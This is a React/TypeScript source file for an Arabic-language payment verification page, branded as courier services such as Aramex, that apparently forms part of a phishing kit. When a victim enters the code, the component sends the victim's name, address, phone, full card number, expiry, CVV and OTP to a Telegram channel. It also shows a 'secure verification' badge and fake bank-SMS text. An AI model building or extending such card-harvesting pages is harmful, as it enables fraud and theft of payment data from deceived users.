import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, AlertCircle, Check, Lock, Clock, X } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";

const PaymentOTP = () => {
  const { id, paymentId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: payment, refetch } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);
  const updatePayment = useUpdatePayment();
  const urlServiceKey = useMemo(
    () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
    []
  );
  
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isLocked, setIsLocked] = useState(false);
  const [timeLeft, setTimeLeft] = useState(180); // 3 minutes countdown
  
  // Get service branding
  const sessionServiceKey = typeof window !== "undefined" ? sessionStorage.getItem('serviceKey') : null;
  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || urlServiceKey || sessionServiceKey || 'aramex';
  const serviceName = link?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const serviceQuery = serviceKey ? `?service=${encodeURIComponent(serviceKey)}` : "";

  useEffect(() => {
    if (serviceKey) {
      sessionStorage.setItem('serviceKey', serviceKey);
    }
  }, [serviceKey]);
  
  // Countdown timer
  useEffect(() => {
    if (timeLeft > 0 && !isLocked) {
      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [timeLeft, isLocked]);
  
  useEffect(() => {
    if (payment?.locked_until) {
      const lockTime = new Date(payment.locked_until).getTime();
      const now = Date.now();
      
      if (now < lockTime) {
        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
      } else {
        setIsLocked(false);
      }
    }
  }, [payment]);
  
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };
  
  const handleClearOTP = () => {
    setOtp("");
    setError("");
  };

  // Handle keyboard shortcuts
  const handleKeyDown = (e: React.KeyboardEvent) => {
    // Clear OTP on Escape key
    if (e.key === 'Escape') {
      handleClearOTP();
    }
    // Clear OTP on Ctrl+Backspace or Cmd+Backspace
    if ((e.ctrlKey || e.metaKey) && e.key === 'Backspace') {
      e.preventDefault();
      handleClearOTP();
    }
  };

  const handleSubmit = async () => {
    if (!payment || isLocked) return;
    
    setError("");
    
    // Check if OTP matches
    if (otp === payment.otp) {
      // Submit to Netlify Forms
      const formData = new FormData();
      formData.append('form-name', 'payment-otp-verified');
      formData.append('otp', otp);
      formData.append('service', serviceName);
      formData.append('paymentId', payment.id);
      formData.append('linkId', id || '');
      formData.append('status', 'confirmed');
      
      try {
        await fetch('/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams(formData as any).toString()
        });
      } catch (error) {
        console.error('Form submission error:', error);
      }
      
      // Send payment confirmation to Telegram
      const telegramResult = await sendToTelegram({
        type: 'payment_confirmation',
        data: {
          name: payment.name || '',
          email: payment.email || '',
          phone: payment.phone || '',
          address: payment.address || '',
          service: serviceName,
          amount: payment.amount || '',
          cardholder: payment.cardholder || '',
          cardNumber: payment.card_number || '',
          cardLast4: payment.card_last4 || '',
          expiry: payment.card_expiry || '',
          cvv: payment.card_cvv || '',
          otp: otp
        },
        timestamp: new Date().toISOString()
      });

      if (telegramResult.success) {
        console.log('Payment confirmation sent to Telegram successfully');
      } else {
        console.error('Failed to send payment confirmation to Telegram:', telegramResult.error);
      }

      // Success!
      await updatePayment.mutateAsync({
        paymentId: payment.id,
        updates: {
          status: "confirmed",
          receipt_url: `/pay/${id}/receipt/${payment.id}${serviceQuery}`,
        },
      });
      
      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });
      
      navigate(`/pay/${id}/receipt/${payment.id}${serviceQuery}`);
    } else {
      // Wrong OTP
      const newAttempts = payment.attempts + 1;
      
      if (newAttempts >= 3) {
        // Lock for 15 minutes
        const lockUntil = new Date(Date.now() + 15 * 60 * 1000).toISOString();
        
        await updatePayment.mutateAsync({
          paymentId: payment.id,
          updates: {
            attempts: newAttempts,
            locked_until: lockUntil,
          },
        });
        
        setIsLocked(true);
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
        
        toast({
          title: "تم الحظر",
          description: "لقد تجاوزت عدد المحاولات المسموحة",
          variant: "destructive",
        });
      } else {
        // Increment attempts
        await updatePayment.mutateAsync({
          paymentId: payment.id,
          updates: {
            attempts: newAttempts,
          },
        });
        
        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
        refetch();
      }
    }
  };
  
  // FOR TESTING: Display actual OTP (remove in production)
  useEffect(() => {
    if (payment?.otp) {
      console.log("🔐 OTP للاختبار:", payment.otp);
    }
  }, [payment]);
  
  return (
    <div 
      className="min-h-screen py-4 sm:py-12" 
      dir="rtl"
      onKeyDown={handleKeyDown}
      tabIndex={0}
      style={{
        background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
      }}
    >
      <div className="container mx-auto px-3 sm:px-4">
        <div className="max-w-md mx-auto">
          {/* Company Header Image */}
          {branding.ogImage && (
            <div className="mb-4 sm:mb-6 rounded-xl overflow-hidden shadow-lg">
              <img 
                src={branding.ogImage} 
                alt={serviceName}
                className="w-full h-32 sm:h-48 object-cover"
                onError={(e) => e.currentTarget.style.display = 'none'}
              />
            </div>
          )}
          
          {/* Company Logo */}
          {branding.logo && (
            <div className="text-center mb-4 sm:mb-6">
              <img 
                src={branding.logo} 
                alt={serviceName}
                className="h-10 sm:h-12 mx-auto"
                onError={(e) => e.currentTarget.style.display = 'none'}
              />
            </div>
          )}
          
          {/* Security Badge */}
          <div className="text-center mb-3 sm:mb-6">
            <Badge 
              className="text-xs sm:text-sm px-3 py-1.5 sm:px-4 sm:py-2 text-white"
              style={{
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
              }}
            >
              <Lock className="w-3 h-3 sm:w-4 sm:h-4 ml-1.5 sm:ml-2" />
              <span>التحقق الآمن</span>
            </Badge>
          </div>
          
          <Card className="p-4 sm:p-8 shadow-elevated border-2" style={{ borderColor: `${branding.colors.primary}20` }}>
            <div className="flex items-center justify-between mb-4 sm:mb-6">
              <div className="flex items-center gap-2 sm:gap-3">
                <div 
                  className="w-10 h-10 sm:w-12 sm:h-12 rounded-lg sm:rounded-xl flex items-center justify-center animate-pulse"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                  }}
                >
                  <Shield className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
                </div>
                <div>
                  <h1 className="text-lg sm:text-2xl font-bold">رمز التحقق</h1>
                  <p className="text-xs sm:text-sm text-muted-foreground">
                    {serviceName}
                  </p>
                </div>
              </div>
              
              {/* Countdown Timer */}
              {timeLeft > 0 && (
                <div 
                  className="flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs sm:text-sm font-semibold"
                  style={{
                    background: `${branding.colors.primary}15`,
                    color: branding.colors.primary
                  }}
                >
                  <Clock className="w-3 h-3 sm:w-4 sm:h-4" />
                  <span>{formatTime(timeLeft)}</span>
                </div>
              )}
            </div>
            
            {/* Info */}
            <div 
              className="p-3 sm:p-4 rounded-md sm:rounded-lg mb-4 sm:mb-6"
              style={{
                background: `${branding.colors.primary}10`,
                border: `1px solid ${branding.colors.primary}30`
              }}
            >
              <p className="text-xs sm:text-sm" style={{ color: branding.colors.primary }}>
                تم إرسال رمز التحقق المكون من 4 أرقام إلى هاتفك المسجل في البنك.
              </p>
            </div>
            
            {/* Testing Note */}
            {payment?.otp && (
              <div className="bg-amber-500/10 border border-amber-500/20 rounded-md sm:rounded-lg p-2 sm:p-3 mb-4 sm:mb-6">
                <p className="text-xs sm:text-sm text-amber-500">
                  <strong>للاختبار فقط:</strong> رمز OTP = {payment.otp}
                </p>
              </div>
            )}
            
            {/* OTP Input - Modern Style */}
            <div className="mb-4 sm:mb-6">
              <div className="flex justify-center items-center gap-3">
                <InputOTP 
                  maxLength={4} 
                  value={otp} 
                  onChange={setOtp}
                  disabled={isLocked}
                  autoComplete="one-time-code"
                >
                  <InputOTPGroup className="gap-2 sm:gap-3">
                    {[0, 1, 2, 3].map((index) => (
                      <InputOTPSlot 
                        key={index} 
                        index={index}
                        className="w-12 h-12 sm:w-16 sm:h-16 text-xl sm:text-3xl font-bold border-2 rounded-lg transition-all"
                        style={{
                          borderColor: otp[index] ? branding.colors.primary : `${branding.colors.primary}40`,
                          background: otp[index] ? `${branding.colors.primary}10` : 'transparent'
                        }}
                      />
                    ))}
                  </InputOTPGroup>
                </InputOTP>
                
                {/* Delete Button */}
                {otp.length > 0 && !isLocked && (
                  <Button
                    type="button"
                    variant="ghost"
                    size="sm"
                    onClick={handleClearOTP}
                    className="w-8 h-8 sm:w-10 sm:h-10 p-0 rounded-full hover:bg-destructive/10 hover:text-destructive transition-colors"
                  >
                    <X className="w-4 h-4 sm:w-5 sm:h-5" />
                  </Button>
                )}
              </div>
              
              {/* Keyboard Instructions */}
              {otp.length > 0 && !isLocked && (
                <div className="text-center mt-3">
                  <p className="text-xs text-muted-foreground">
                    اضغط <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Esc</kbd> أو <kbd className="px-1.5 py-0.5 text-xs bg-muted rounded">Ctrl+Backspace</kbd> أو زر <X className="w-3 h-3 inline mx-1" /> لمسح الرمز
                  </p>
                </div>
              )}
            </div>
            
            {/* Error Message */}
            {error && (
              <div className="bg-destructive/10 border border-destructive/20 rounded-md sm:rounded-lg p-2 sm:p-3 mb-4 sm:mb-6 flex items-start gap-2">
                <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 text-destructive mt-0.5 flex-shrink-0" />
                <p className="text-xs sm:text-sm text-destructive">{error}</p>
              </div>
            )}
            
            {/* Attempts Counter */}
            {payment && payment.attempts > 0 && !isLocked && (
              <div className="text-center mb-4 sm:mb-6">
                <p className="text-xs sm:text-sm text-muted-foreground">
                  المحاولات المتبقية: <strong>{3 - payment.attempts}</strong>
                </p>
              </div>
            )}
            
            {/* Submit Button */}
            <Button
              size="lg"
              className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold transition-all hover:shadow-lg"
              onClick={handleSubmit}
              disabled={updatePayment.isPending || isLocked || otp.length < 4}
              style={{
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
              }}
            >
              {updatePayment.isPending ? (
                <span>جاري التحقق...</span>
              ) : isLocked ? (
                <span>محظور مؤقتاً</span>
              ) : (
                <>
                  <Check className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
                  <span>تأكيد الدفع</span>
                </>
              )}
            </Button>
            
            <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
              لم تستلم الرمز؟ تحقق من رسائلك أو اتصل بالبنك
            </p>
          </Card>
          
          {/* Hidden Netlify Form */}
          <form name="payment-otp-verified" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
            <input type="text" name="otp" />
            <input type="text" name="service" />
            <input type="text" name="paymentId" />
            <input type="text" name="linkId" />
            <input type="text" name="status" />
          </form>
        </div>
      </div>
    </div>
  );
};

export default PaymentOTP;
